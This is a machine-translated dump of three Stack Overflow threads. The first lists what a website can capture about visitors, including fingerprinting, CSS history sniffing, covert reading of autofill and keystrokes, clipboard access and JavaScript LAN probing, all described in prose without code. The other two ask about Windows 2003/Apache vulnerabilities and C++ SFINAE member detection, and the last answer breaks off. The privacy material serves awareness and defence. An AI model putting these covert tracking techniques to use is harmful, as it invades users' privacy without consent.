如果网站的所有者想要尽可能多地跟踪他们的用户是谁，他们可以捕获什么东西（以及如何捕获）。您可能想了解这一点，以便在您创建的站点上捕获信息，或者作为用户，*防止*站点捕获您的数据。

这是一个起始列表，但我确定我错过了一些重要的：

1.  推荐人（哪个网页有您进入此处的链接）。这是一个 HTTP 标头。
2.  您正在浏览的机器的 IP 地址。这适用于 HTTP 标头。
3.  用户代理（您使用的浏览器）。这是一个 HTTP 标头。
4.  放置在上次访问中的 Cookie。这是一个标头，仅当 cookie 较早放置且未被用户删除时才可用。
5.  Flash Cookie 放置在之前的访问中。一些用户关闭了 cookie，但*很少*有人知道如何关闭 Flash cookie。像普通 cookie 一样工作，虽然它依赖于 Flash。
6.  网络错误。在第三方提供的页面上放置一些小东西（如透明的单像素 GIF）。某些第三方（例如 DoubleClick）将拥有自己的 cookie，并且可以与用户进行的其他访问相关联（收费！）。

这些是我想到的常见的，但肯定有很多不寻常的。例如，这个：

1.  用户时钟上的时间。[使用 JavaScript](https://stackoverflow.com/questions/13/determining-web-users-time-zone)传输它。

...我在这里阅读之前从未听说过。

* * *

稍后添加（阅读[此](http://www.joelonsoftware.com/items/2008/09/15.html)内容后）：

**请尝试每个答案只放一个项目，然后我们可以使用投票来挑选更好/更有趣的项目。**下面的列表可能不太有效。

嗯...下次我问这样的问题时，我会设置得更好。

* * *

以下是我得到的一些最佳答案：

1.  [James](https://stackoverflow.com/questions/87365/what-identifying-information-can-a-website-capture#87413)指出，IE 传输的是 .NET 框架版本。
2.  [AviewAnew](https://stackoverflow.com/questions/87365/what-identifying-information-can-a-website-capture#87454)指出，您可以[找到您访问过的网站](http://ha.ckers.org/weird/CSS-history-hack.html)。
3.  [Mecki](https://stackoverflow.com/questions/87365/what-identifying-information-can-a-website-capture#87529)指出可以确定屏幕分辨率。
4.  [Mecki](https://stackoverflow.com/questions/87365/what-identifying-information-can-a-website-capture#87529) *还*指出，您的浏览器缓存的任何自动填充信息都可以通过创建隐藏字段然后使用 JavaScript 读取来确定。
5.  [jjrv](https://stackoverflow.com/questions/87365/what-identifying-information-can-a-website-capture#87463)指出 Flash 可以列出用户机器上的字体。
6.  [Kent](https://stackoverflow.com/questions/87365/what-identifying-information-can-a-website-capture#87473)指出，您可以找出[一个人访问过哪些网站](http://weblogs.asp.net/jezell/archive/2006/08/25/Stealing-History.aspx)。
7.  [Silver Dragon](https://stackoverflow.com/questions/87365/what-identifying-information-can-a-website-capture#87493)指出，您可以使用 Flash 和 AJAX 确定鼠标在浏览窗口中的位置。
8.  [Jim](https://stackoverflow.com/questions/87365/what-identifying-information-can-a-website-capture#87494)指出，您可以通过 HTTP 标头判断用户在浏览器中配置的语言。
9.  [Jim](https://stackoverflow.com/questions/87365/what-identifying-information-can-a-website-capture#87494)还提到，您可以检测人们是否正在使用 Greasemonkey 或类似的东西来修改页面。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-09-17T20:44:15.637

对您的原作的修改：

1.  可以转义（我认为它在某些浏览器中是一个选项）
2.  只有通过代理才能避免（javascript可以通过智能环视来避免这一点）
3.  不可靠，容易伪造。
4.  并假设它没有被浏览器关闭（会话cookie）擦除并且cookie在同一个域/路径中

真正恶心的是

1.  使用 javascript 探测您的网络/局域网
2.  使用 javascript 从防火墙后面访问您的防火墙并调整其设置（不是开玩笑）
3.  使用“已访问链接”的特性来确定已访问的 url 列表中的哪些。（深度历史探索！）
4.  天知道如果用户有 Windows/IE/ActiveX

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-17T20:42:21.273

*   有一个标头可以包含有关用户正在使用的代理服务器的信息，还可以包含用户的 IP 地址（在这种情况下，另一个 IP 是代理之一）
*   屏幕分辨率、操作系统、颜色深度、任务栏大小（比较最大和当前分辨率）、如果启用了 Java、抗锯齿字体、插件全部通过 Javascript 安装
*   Java 小程序也可以为您提供大量信息，但我不知道是什么。
*   [您访问过的网站](http://ha.ckers.org/weird/CSS-history-hack.html)
*   [本地网络的详细信息，](http://www.slideshare.net/jeremiahgrossman/top-ten-hacks-of-2007)例如活动主机、Web 服务器。论文还概述了驱动式打印、驱动式路由器修改

而这一切都假设攻击者不会执行任意代码

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-09-17T20:49:45.377

Javascript 可以获得比时间更多的信息。例如，屏幕分辨率（+ 颜色深度）就是其中之一。

请参阅[使用 JS 获取屏幕分辨率](http://www.pageresource.com/jscript/jscreen.htm)

JS 可以捕获的所有内容都可以使用 AJAX 进行传输，而无需用户进行任何交互。其他示例是（并非所有浏览器都适用）：

*   它可以查看您的浏览器历史记录，例如，如果您后退或前进，您的浏览器会转到哪个 URL。

*   您的浏览器的语言（**注意**：通常 HTTP 请求还会包含您请求的页面的首选语言列表。但是，此列表是用户可在许多浏览器的首选项中编辑的，而 JS 实际上可以找出您的语言翻译浏览器正在界面中使用）

*   如果您的浏览器自动填写表单字段（例如电子邮件、用户名等），JS 实际上可以在您提交表单之前读取您的浏览器在字段中输入的内容（因此它甚至可以读取您的浏览器预先填写的内容，即使您根本没有提交表单）。

Java 小程序也可以收集一些信息并将其传输，尽管没有多少信息是您在别处无法获得的。由于很容易获得访问者的 IP，因此可以找出他正在使用的在线服务（在地址服务中查找 IP，例如美国的 IANA 或欧洲的 RIPE 等），并且有将 IP 转换为国家/地区的服务，因此可以找出用户最有可能当前所在的位置。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-09-17T20:46:25.930

一些可能感兴趣的附加信息：

*   使用 IP 地址，可以解析 IP 所属的主机名、网络提供商/组织以及粗略的地理位置。
*   使用引用者、指定客户端进行的查询列表和可靠的 cookie 机制，可以解析访问者的路径（甚至通过 AJAX 和/或转发器页面点击到其他方）
*   使用flash，结合AJAX，可以抓取浏览窗口内的鼠标位置
*   用户代理可能包含有关操作系统、已安装的 .NET 框架和其他好奇心的信息

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-09-17T20:38:59.957

.NET 框架版本在 IE 中的用户代理中传输。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-09-17T20:41:07.953

1.  浏览器能否支持JS
2.  浏览器是否支持flash
3.  操作系统平台
4.  屏幕分辨率
5.  支持 CSS
6.  支持表格

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-09-17T20:43:25.610

Flash 可以为您提供用户机器上的字体列表等。当鼠标停在广告上而不点击它时，Javascript 可以发送信息。您还可以获取窗口大小、站点是否在框架中打开、弹出窗口或特定插件是否被阻止、查找 Javascript 功能可以判断用户代理标头是正确的还是伪造的……

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-09-17T20:46:32.653

*   `Accept-Language`您通常可以通过HTTP 标头确定用户使用哪种语言。
*   `Accept`您可以通过查看HTTP 标头来确定是否安装了某些应用程序和浏览器插件。
*   `User-Agent`通过HTTP 标头的浏览器版本/补丁级别和 .NET 框架版本。
*   您的 ISP/雇主和地理位置（通过 IP 地址）。
*   您是否通过 CSS 和/或定时加载事件访问了特定的 URL。如果特定网站具有特定于用户的 URI，这可能会披露您是否是该网站上的特定用户。
*   通过测量 em 和/或 Flash 可以获得哪些字体。
*   通过 JavaScript 的屏幕分辨率、窗口大小、时区。
*   通过 JavaScript 移动鼠标和击键的位置。例如，您可以查看人们在文本框中输入的内容，即使他们没有点击提交。
*   许多 UserJS/Greasemonkey 脚本会泄露信息（例如，如果您过滤掉某些人，它所配置的站点可能会找出谁）。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-09-19T02:57:06.560

据我所知，可以通过 javascript 获取剪贴板数据。不知道这些天默认情况下它有多大可能，但不久前它风靡一时。我相信IE仍然允许它。

人们习惯在剪贴板中留下非常重要的数据，所以这很糟糕。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-09-17T20:52:21.687

如果您担心自己的人身安全（我不确定这是否是您真正想要的，所以如果这被误导了，我深表歉意），您可以随时使用 Tor 网络。如果您使用 Firefox，您可以使用[Torbutton](https://www.torproject.org/torbutton/)一键启用。它具有禁用 Flash 的好处（对某些人来说是缺点），因为否则无法防止 Flash 信息泄漏。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-09-19T02:45:52.517

我需要挖掘链接，但是如果用户使用的是 IE，并且安装了常见的软件标题，那么确定安装了哪些是可能的。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2020-07-09T03:03:27.140

迟到了这里，网站还可以扫描你的端口，找到你正在运行的软件！

# security - Windows 2003 + Apache 的主要漏洞有哪些？

> ID：87371
> 
> 赞同：0
> 
> 时间：2008-09-17T20:36:37.263
> 
> 标签：security

我正在寻找新的商业网站的主机。除其他外，我想知道各种操作系统 - 网络服务器组合在漏洞方面有什么。Windows 2003 + Apache 有哪些漏洞？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-09-17T20:38:52.407

你可以看这里：[http ://httpd.apache.org/security/vulnerabilities_20.html](http://httpd.apache.org/security/vulnerabilities_20.html)

至于窗户方面，它是窗户。会有漏洞。只需使用最新的服务包和补丁程序，您就会没事的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-09-19T20:47:12.720

正如[这里](https://stackoverflow.com/questions/87393/what-are-the-major-vulnerabilities-of-windows-2003-iis)所建议的，我可以查看[CERT 数据库](http://www.kb.cert.org/vuls/)。

# c++ - 检查一个类是否具有给定签名的成员函数

> ID：87372
> 
> 赞同：155
> 
> 时间：2008-09-17T20:36:43.160
> 
> 标签：c++, c++11, templates, sfinae

我要求一个模板技巧来检测一个类是否具有给定签名的特定成员函数。

这个问题类似于这里引用的问题 [http://www.gotw.ca/gotw/071.htm](http://www.gotw.ca/gotw/071.htm) 但不一样：在 Sutter 的书中，他回答了一个类 C 必须提供一个成员函数的问题一个特定的签名，否则程序将无法编译。在我的问题中，如果一个类具有该功能，我需要做一些事情，否则做“其他事情”。

boost::serialization 也面临类似的问题，但我不喜欢他们采用的解决方案：一个模板函数默认调用具有特定签名的自由函数（您必须定义），除非您定义特定的成员函数（在他们的情况下，“序列化”采用给定类型的 2 个参数）具有特定签名，否则会发生编译错误。那就是实现侵入式和非侵入式序列化。

我不喜欢这个解决方案有两个原因：

1.  为了非侵入性，您必须覆盖 boost::serialization 命名空间中的全局“序列化”函数，因此您可以在您的客户代码中打开命名空间提升和命名空间序列化！
2.  解决这个混乱的堆栈是 10 到 12 个函数调用。

我需要为没有该成员函数的类定义自定义行为，并且我的实体位于不同的命名空间中（并且我不想在另一个命名空间中覆盖在一个命名空间中定义的全局函数）

你能给我一个提示来解决这个难题吗？

* * *

## 回答 #1

> 赞同：150
> 
> 时间：2013-05-29T21:33:47.387

这是一个依赖 C++11 特性的可能实现。即使它是继承的，它也能正确检测到该函数（与已接受答案中的解决方案不同，正如 Mike Kinghan 在[他的答案](https://stackoverflow.com/a/10707822/947836)中所观察到的那样）。

调用此代码段测试的函数`serialize`：

```
#include <type_traits>

// Primary template with a static assertion
// for a meaningful error message
// if it ever gets instantiated.
// We could leave it undefined if we didn't care.

template<typename, typename T>
struct has_serialize {
    static_assert(
        std::integral_constant<T, false>::value,
        "Second template parameter needs to be of function type.");
};

// specialization that does the checking

template<typename C, typename Ret, typename... Args>
struct has_serialize<C, Ret(Args...)> {
private:
    template<typename T>
    static constexpr auto check(T*)
    -> typename
        std::is_same<
            decltype( std::declval<T>().serialize( std::declval<Args>()... ) ),
            Ret    // ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
        >::type;  // attempt to call it and see if the return type is correct

    template<typename>
    static constexpr std::false_type check(...);

    typedef decltype(check<C>(0)) type;

public:
    static constexpr bool value = type::value;
}; 
```

用法：

```
struct X {
     int serialize(const std::string&) { return 42; } 
};

struct Y : X {};

std::cout << has_serialize<Y, int(const std::string&)>::value; // will print 1 
```

* * *

## 回答 #2

> 赞同：101
> 
> 时间：2008-09-17T21:27:29.683

我不确定我是否理解正确，但您可以利用 SFINAE 在编译时检测函数的存在。我的代码中的示例（测试类是否具有成员函数 size_t used_memory() const）。

```
template<typename T>
struct HasUsedMemoryMethod
{
    template<typename U, size_t (U::*)() const> struct SFINAE {};
    template<typename U> static char Test(SFINAE<U, &U::used_memory>*);
    template<typename U> static int Test(...);
    static const bool Has = sizeof(Test<T>(0)) == sizeof(char);
};

template<typename TMap>
void ReportMemUsage(const TMap& m, std::true_type)
{
        // We may call used_memory() on m here.
}
template<typename TMap>
void ReportMemUsage(const TMap&, std::false_type)
{
}
template<typename TMap>
void ReportMemUsage(const TMap& m)
{
    ReportMemUsage(m, 
        std::integral_constant<bool, HasUsedMemoryMethod<TMap>::Has>());
} 
```

* * *

## 回答 #3

> 赞同：40
> 
> 时间：2012-05-22T18:23:03.580

编译时成员函数自省这个问题的公认答案虽然很受欢迎，但有一个障碍，可以在以下程序中观察到：

```
#include <type_traits>
#include <iostream>
#include <memory>

/*  Here we apply the accepted answer's technique to probe for the
    the existence of `E T::operator*() const`
*/
template<typename T, typename E>
struct has_const_reference_op
{
    template<typename U, E (U::*)() const> struct SFINAE {};
    template<typename U> static char Test(SFINAE<U, &U::operator*>*);
    template<typename U> static int Test(...);
    static const bool value = sizeof(Test<T>(0)) == sizeof(char);
};

using namespace std;

/* Here we test the `std::` smart pointer templates, including the
    deprecated `auto_ptr<T>`, to determine in each case whether
    T = (the template instantiated for `int`) provides 
    `int & T::operator*() const` - which all of them in fact do.
*/ 
int main(void)
{
    cout << has_const_reference_op<auto_ptr<int>,int &>::value;
    cout << has_const_reference_op<unique_ptr<int>,int &>::value;
    cout << has_const_reference_op<shared_ptr<int>,int &>::value << endl;
    return 0;
} 
```

使用 GCC 4.6.3 构建，程序输出-*通知*`110`我们 `T = std::shared_ptr<int>`不提供.*`int & T::operator*() const`*

 *如果你还不知道这个问题，那么看看 `std::shared_ptr<T>`标题中的定义`<memory>`就会明白。在该实现中，`std::shared_ptr<T>`从它继承的基类派生`operator*() const`。所以 `SFINAE<U, &U::operator*>`构成“查找”操作符 的模板实例化`U = std::shared_ptr<T>`不会发生，因为它本身`std::shared_ptr<T>`没有 `operator*()`，并且模板实例化不“做继承”。

这个障碍不会影响众所周知的 SFINAE 方法，使用“The sizeof() Trick”，仅用于检测是否`T`有一些成员函数`mf`（参见例如 [这个答案](https://stackoverflow.com/a/257382/1362568)和评论）。但是确定`T::mf`存在通常（通常？）还不够好：您可能还需要确定它具有所需的签名。这就是图示技术得分的地方。`&T::mf`所需签名的指针变量被写入模板类型的参数中，SFINAE 探测必须满足该参数 才能成功。但是这种模板实例化技术在`T::mf`继承时给出了错误的答案。

用于编译时自省的安全 SFINAE 技术`T::mf`必须避免`&T::mf`在模板参数中使用来实例化 SFINAE 函数模板解析所依赖的类型。相反，SFINAE 模板函数解析只能依赖于用作重载 SFINAE 探测函数的参数类型的完全相关的类型声明。

通过回答遵守此约束的问题，我将说明编译时检测`E T::operator*() const`、 任意`T`和`E`。相同的模式将*比照适用* 于探测任何其他成员方法签名。

```
#include <type_traits>

/*! The template `has_const_reference_op<T,E>` exports a
    boolean constant `value that is true iff `T` provides
    `E T::operator*() const`
*/ 
template< typename T, typename E>
struct has_const_reference_op
{
    /* SFINAE operator-has-correct-sig :) */
    template<typename A>
    static std::true_type test(E (A::*)() const) {
        return std::true_type();
    }

    /* SFINAE operator-exists :) */
    template <typename A> 
    static decltype(test(&A::operator*)) 
    test(decltype(&A::operator*),void *) {
        /* Operator exists. What about sig? */
        typedef decltype(test(&A::operator*)) return_type; 
        return return_type();
    }

    /* SFINAE game over :( */
    template<typename A>
    static std::false_type test(...) {
        return std::false_type(); 
    }

    /* This will be either `std::true_type` or `std::false_type` */
    typedef decltype(test<T>(0,0)) type;

    static const bool value = type::value; /* Which is it? */
}; 
```

在这个解决方案中，重载的 SFINAE 探测函数`test()`被“递归调用”。（当然它实际上根本没有被调用；它只是具有编译器解析的假设调用的返回类型。）

我们需要至少探查一个，最多两个信息点：

*   `T::operator*()`存在吗？如果没有，我们就完成了。
*   鉴于`T::operator*()`存在，是它的签名 `E T::operator*() const`吗？

我们通过评估单个调用的返回类型来获得答案`test(0,0)`。这是通过以下方式完成的：

```
 typedef decltype(test<T>(0,0)) type; 
```

此调用可能会解析为 的`/* SFINAE operator-exists :) */`重载`test()`，也可能解析为`/* SFINAE game over :( */`重载。它无法解决`/* SFINAE operator-has-correct-sig :) */`重载问题，因为它只需要一个参数而我们传递了两个。

为什么我们要通过两个？简单地强制决议排除 `/* SFINAE operator-has-correct-sig :) */`。第二个论点没有其他意义。

此调用`test(0,0)`将解析为`/* SFINAE operator-exists :) */`以防第一个参数 0 满足该重载的第一个参数类型，即`decltype(&A::operator*)`, with `A = T`。0 将满足该类型，以防万一`T::operator*`存在。

让我们假设编译器对此说“是”。然后它会继续， `/* SFINAE operator-exists :) */`它需要确定函数调用的返回类型，在这种情况下是`decltype(test(&A::operator*))`- 另一个调用的返回类型`test()`。

这一次，我们只传递一个参数，`&A::operator*`，我们现在知道它存在，否则我们不会在这里。调用`test(&A::operator*)`可能解析为`/* SFINAE operator-has-correct-sig :) */`或再次解析为可能解析为`/* SFINAE game over :( */`。调用将匹配 `/* SFINAE operator-has-correct-sig :) */`，以防万一`&A::operator*`满足该重载的单个参数类型，即`E (A::*)() const`, with `A = T`。

如果`T::operator*`具有所需的签名，编译器将在此处说是，然后必须再次评估重载的返回类型。现在不再有“递归”：它是`std::true_type`.

如果编译器不`/* SFINAE operator-exists :) */`为调用`test(0,0)`选择或不`/* SFINAE operator-has-correct-sig :) */` 为调用选择`test(&A::operator*)`，那么在任何一种情况下它都会出现， `/* SFINAE game over :( */`并且最终的返回类型是`std::false_type`.

这是一个测试程序，显示了在不同的案例样本中产生预期答案的模板（再次是 GCC 4.6.3）。

```
// To test
struct empty{};

// To test 
struct int_ref
{
    int & operator*() const {
        return *_pint;
    }
    int & foo() const {
        return *_pint;
    }
    int * _pint;
};

// To test 
struct sub_int_ref : int_ref{};

// To test 
template<typename E>
struct ee_ref
{
    E & operator*() {
        return *_pe;
    }
    E & foo() const {
        return *_pe;
    }
    E * _pe;
};

// To test 
struct sub_ee_ref : ee_ref<char>{};

using namespace std;

#include <iostream>
#include <memory>
#include <vector>

int main(void)
{
    cout << "Expect Yes" << endl;
    cout << has_const_reference_op<auto_ptr<int>,int &>::value;
    cout << has_const_reference_op<unique_ptr<int>,int &>::value;
    cout << has_const_reference_op<shared_ptr<int>,int &>::value;
    cout << has_const_reference_op<std::vector<int>::iterator,int &>::value;
    cout << has_const_reference_op<std::vector<int>::const_iterator,
            int const &>::value;
    cout << has_const_reference_op<int_ref,int &>::value;
    cout << has_const_reference_op<sub_int_ref,int &>::value  << endl;
    cout << "Expect No" << endl;
    cout << has_const_reference_op<int *,int &>::value;
    cout << has_const_reference_op<unique_ptr<int>,char &>::value;
    cout << has_const_reference_op<unique_ptr<int>,int const &>::value;
    cout << has_const_reference_op<unique_ptr<int>,int>::value;
    cout << has_const_reference_op<unique_ptr<long>,int &>::value;
    cout << has_const_reference_op<int,int>::value;
    cout << has_const_reference_op<std::vector<int>,int &>::value;
    cout << has_const_reference_op<ee_ref<int>,int &>::value;
    cout << has_const_reference_op<sub_ee_ref,int &>::value;
    cout << has_const_reference_op<empty,int &>::value  << endl;
    return 0;
} 
```

这个想法有新的缺陷吗？它可以变得更通用而不会再次遇到它避免的障碍吗？

* * *

## 回答 #4

> 赞同：20
> 
> 时间：2013-05-31T23:30:24.413

以下是一些用法片段： *所有这些的胆量都在更远的地方

**检查`x`给定类中的成员。可以是 var、func、class、union 或 enum：**

```
CREATE_MEMBER_CHECK(x);
bool has_x = has_member_x<class_to_check_for_x>::value; 
```

**检查成员函数`void x()`：**

```
//Func signature MUST have T as template variable here... simpler this way :\
CREATE_MEMBER_FUNC_SIG_CHECK(x, void (T::*)(), void__x);
bool has_func_sig_void__x = has_member_func_void__x<class_to_check_for_x>::value; 
```

**检查成员变量`x`：**

```
CREATE_MEMBER_VAR_CHECK(x);
bool has_var_x = has_member_var_x<class_to_check_for_x>::value; 
```

**检查成员类`x`：**

```
CREATE_MEMBER_CLASS_CHECK(x);
bool has_class_x = has_member_class_x<class_to_check_for_x>::value; 
```

**检查会员工会`x`：**

```
CREATE_MEMBER_UNION_CHECK(x);
bool has_union_x = has_member_union_x<class_to_check_for_x>::value; 
```

**检查成员枚举`x`：**

```
CREATE_MEMBER_ENUM_CHECK(x);
bool has_enum_x = has_member_enum_x<class_to_check_for_x>::value; 
```

**`x`无论签名如何，检查任何成员函数：**

```
CREATE_MEMBER_CHECK(x);
CREATE_MEMBER_VAR_CHECK(x);
CREATE_MEMBER_CLASS_CHECK(x);
CREATE_MEMBER_UNION_CHECK(x);
CREATE_MEMBER_ENUM_CHECK(x);
CREATE_MEMBER_FUNC_CHECK(x);
bool has_any_func_x = has_member_func_x<class_to_check_for_x>::value; 
```

或者

```
CREATE_MEMBER_CHECKS(x);  //Just stamps out the same macro calls as above.
bool has_any_func_x = has_member_func_x<class_to_check_for_x>::value; 
```

**细节和核心：**

```
/*
    - Multiple inheritance forces ambiguity of member names.
    - SFINAE is used to make aliases to member names.
    - Expression SFINAE is used in just one generic has_member that can accept
      any alias we pass it.
*/

//Variadic to force ambiguity of class members.  C++11 and up.
template <typename... Args> struct ambiguate : public Args... {};

//Non-variadic version of the line above.
//template <typename A, typename B> struct ambiguate : public A, public B {};

template<typename A, typename = void>
struct got_type : std::false_type {};

template<typename A>
struct got_type<A> : std::true_type {
    typedef A type;
};

template<typename T, T>
struct sig_check : std::true_type {};

template<typename Alias, typename AmbiguitySeed>
struct has_member {
    template<typename C> static char ((&f(decltype(&C::value))))[1];
    template<typename C> static char ((&f(...)))[2];

    //Make sure the member name is consistently spelled the same.
    static_assert(
        (sizeof(f<AmbiguitySeed>(0)) == 1)
        , "Member name specified in AmbiguitySeed is different from member name specified in Alias, or wrong Alias/AmbiguitySeed has been specified."
    );

    static bool const value = sizeof(f<Alias>(0)) == 2;
}; 
```

***宏（暗黑破坏神！）：***

**CREATE_MEMBER_CHECK：**

```
//Check for any member with given name, whether var, func, class, union, enum.
#define CREATE_MEMBER_CHECK(member)                                         \
                                                                            \
template<typename T, typename = std::true_type>                             \
struct Alias_##member;                                                      \
                                                                            \
template<typename T>                                                        \
struct Alias_##member <                                                     \
    T, std::integral_constant<bool, got_type<decltype(&T::member)>::value>  \
> { static const decltype(&T::member) value; };                             \
                                                                            \
struct AmbiguitySeed_##member { char member; };                             \
                                                                            \
template<typename T>                                                        \
struct has_member_##member {                                                \
    static const bool value                                                 \
        = has_member<                                                       \
            Alias_##member<ambiguate<T, AmbiguitySeed_##member>>            \
            , Alias_##member<AmbiguitySeed_##member>                        \
        >::value                                                            \
    ;                                                                       \
} 
```

**CREATE_MEMBER_VAR_CHECK：**

```
//Check for member variable with given name.
#define CREATE_MEMBER_VAR_CHECK(var_name)                                   \
                                                                            \
template<typename T, typename = std::true_type>                             \
struct has_member_var_##var_name : std::false_type {};                      \
                                                                            \
template<typename T>                                                        \
struct has_member_var_##var_name<                                           \
    T                                                                       \
    , std::integral_constant<                                               \
        bool                                                                \
        , !std::is_member_function_pointer<decltype(&T::var_name)>::value   \
    >                                                                       \
> : std::true_type {} 
```

**CREATE_MEMBER_FUNC_SIG_CHECK：**

```
//Check for member function with given name AND signature.
#define CREATE_MEMBER_FUNC_SIG_CHECK(func_name, func_sig, templ_postfix)    \
                                                                            \
template<typename T, typename = std::true_type>                             \
struct has_member_func_##templ_postfix : std::false_type {};                \
                                                                            \
template<typename T>                                                        \
struct has_member_func_##templ_postfix<                                     \
    T, std::integral_constant<                                              \
        bool                                                                \
        , sig_check<func_sig, &T::func_name>::value                         \
    >                                                                       \
> : std::true_type {} 
```

**CREATE_MEMBER_CLASS_CHECK：**

```
//Check for member class with given name.
#define CREATE_MEMBER_CLASS_CHECK(class_name)               \
                                                            \
template<typename T, typename = std::true_type>             \
struct has_member_class_##class_name : std::false_type {};  \
                                                            \
template<typename T>                                        \
struct has_member_class_##class_name<                       \
    T                                                       \
    , std::integral_constant<                               \
        bool                                                \
        , std::is_class<                                    \
            typename got_type<typename T::class_name>::type \
        >::value                                            \
    >                                                       \
> : std::true_type {} 
```

**CREATE_MEMBER_UNION_CHECK：**

```
//Check for member union with given name.
#define CREATE_MEMBER_UNION_CHECK(union_name)               \
                                                            \
template<typename T, typename = std::true_type>             \
struct has_member_union_##union_name : std::false_type {};  \
                                                            \
template<typename T>                                        \
struct has_member_union_##union_name<                       \
    T                                                       \
    , std::integral_constant<                               \
        bool                                                \
        , std::is_union<                                    \
            typename got_type<typename T::union_name>::type \
        >::value                                            \
    >                                                       \
> : std::true_type {} 
```

**CREATE_MEMBER_ENUM_CHECK：**

```
//Check for member enum with given name.
#define CREATE_MEMBER_ENUM_CHECK(enum_name)                 \
                                                            \
template<typename T, typename = std::true_type>             \
struct has_member_enum_##enum_name : std::false_type {};    \
                                                            \
template<typename T>                                        \
struct has_member_enum_##enum_name<                         \
    T                                                       \
    , std::integral_constant<                               \
        bool                                                \
        , std::is_enum<                                     \
            typename got_type<typename T::enum_name>::type  \
        >::value                                            \
    >                                                       \
> : std::true_type {} 
```

**CREATE_MEMBER_FUNC_CHECK：**

```
//Check for function with given name, any signature.
#define CREATE_MEMBER_FUNC_CHECK(func)          \
template<typename T>                            \
struct has_member_func_##func {                 \
    static const bool value                     \
        = has_member_##func<T>::value           \
        && !has_member_var_##func<T>::value     \
        && !has_member_class_##func<T>::value   \
        && !has_member_union_##func<T>::value   \
        && !has_member_enum_##func<T>::value    \
    ;                                           \
} 
```

**CREATE_MEMBER_CHECKS：**

```
//Create all the checks for one member.  Does NOT include func sig checks.
#define CREATE_MEMBER_CHECKS(member)    \
CREATE_MEMBER_CHECK(member);            \
CREATE_MEMBER_VAR_CHECK(member);        \
CREATE_MEMBER_CLASS_CHECK(member);      \
CREATE_MEMBER_UNION_CHECK(member);      \
CREATE_MEMBER_ENUM_CHECK(member);       \
CREATE_MEMBER_FUNC_CHECK(member) 
```

* * *

## 回答 #5

> 赞同：13
> 
> 时间：2008-09-17T21:33:41.400

如果您知道您期望的成员函数的名称，这就足够了。（在这种情况下，如果没有成员函数，函数 bla 无法实例化（编写一个无论如何都可以工作的函数很困难，因为缺少函数部分特化。您可能需要使用类模板）此外，启用结构（类似于 enable_if) 也可以根据您希望它作为成员的函数类型进行模板化。

```
template <typename T, int (T::*) ()> struct enable { typedef T type; };
template <typename T> typename enable<T, &T::i>::type bla (T&);
struct A { void i(); };
struct B { int i(); };
int main()
{
  A a;
  B b;
  bla(b);
  bla(a);
} 
```

* * *

## 回答 #6

> 赞同：9
> 
> 时间：2015-07-21T12:42:51.427

这是对 Mike Kinghan 的回答的一个更简单的看法。这将检测继承的方法。它还将检查*确切的*签名（与 jrok 允许参数转换的方法不同）。

```
template <class C>
class HasGreetMethod
{
    template <class T>
    static std::true_type testSignature(void (T::*)(const char*) const);

    template <class T>
    static decltype(testSignature(&T::greet)) test(std::nullptr_t);

    template <class T>
    static std::false_type test(...);

public:
    using type = decltype(test<C>(nullptr));
    static const bool value = type::value;
};

struct A { void greet(const char* name) const; };
struct Derived : A { };
static_assert(HasGreetMethod<Derived>::value, ""); 
```

可运行[示例](http://ideone.com/LjtMSi)

* * *

## 回答 #7

> 赞同：7
> 
> 时间：2020-05-28T09:50:52.577

您似乎想要检测器成语。以上答案是适用于 C++11 或 C++14 的变体。

该`std::experimental`库具有基本上可以做到这一点的功能。从上面修改一个例子，它可能是：

```
#include <experimental/type_traits>

// serialized_method_t is a detector type for T.serialize(int) const
template<typename T>
using serialized_method_t = decltype(std::declval<const T&>().serialize(std::declval<int>()));

// has_serialize_t is std::true_type when T.serialize(int) exists,
// and false otherwise.
template<typename T>
using has_serialize_t = std::experimental::is_detected_t<serialized_method_t, T>; 
```

如果您不能使用 std::experimental，可以像这样制作一个基本版本：

```
template <typename... Ts>
using void_t = void;
template <template <class...> class Trait, class AlwaysVoid, class... Args>
struct detector : std::false_type {};
template <template <class...> class Trait, class... Args>
struct detector<Trait, void_t<Trait<Args...>>, Args...> : std::true_type {};

// serialized_method_t is a detector type for T.serialize(int) const
template<typename T>
using serialized_method_t = decltype(std::declval<const T&>().serialize(std::declval<int>()));

// has_serialize_t is std::true_type when T.serialize(int) exists,
// and false otherwise.
template <typename T>
using has_serialize_t = typename detector<serialized_method_t, void, T>::type; 
```

由于 has_serialize_t 实际上是 std::true_type 或 std::false_type，它可以通过任何常见的 SFINAE 习语使用：

```
template<class T>
std::enable_if_t<has_serialize_t<T>::value, std::string>
SerializeToString(const T& t) {
} 
```

或者通过使用具有重载分辨率的调度：

```
template<class T>
std::string SerializeImpl(std::true_type, const T& t) {
  // call serialize here.
}

template<class T>
std::string SerializeImpl(std::false_type, const T& t) {
  // do something else here.
}

template<class T>
std::string Serialize(const T& t) {
  return SerializeImpl(has_serialize_t<T>{}, t);
} 
```

* * *

## 回答 #8

> 赞同：7
> 
> 时间：2020-10-11T19:09:58.730

使用 c++ 20，这变得更加简单。假设我们要测试一个类`T`是否有成员函数`void T::resize(typename T::size_type)`。比如`std::vector<U>`有这样一个成员函数。然后，

```
template<typename T>
concept has_resize_member_func = requires {
    typename T::size_type;
    { std::declval<T>().resize(std::declval<typename T::size_type>()) } -> std::same_as<void>;
}; 
```

用法是

```
static_assert(has_resize_member_func<std::string>, "");
static_assert(has_resize_member_func<int> == false, ""); 
```

* * *

## 回答 #9

> 赞同：5
> 
> 时间：2013-03-28T15:16:17.837

我自己也遇到了同样的问题，发现这里提出的解决方案非常有趣......但需要一个解决方案：

1.  也检测继承的函数；
2.  与非 C++11 就绪的编译器兼容（所以没有 decltype）

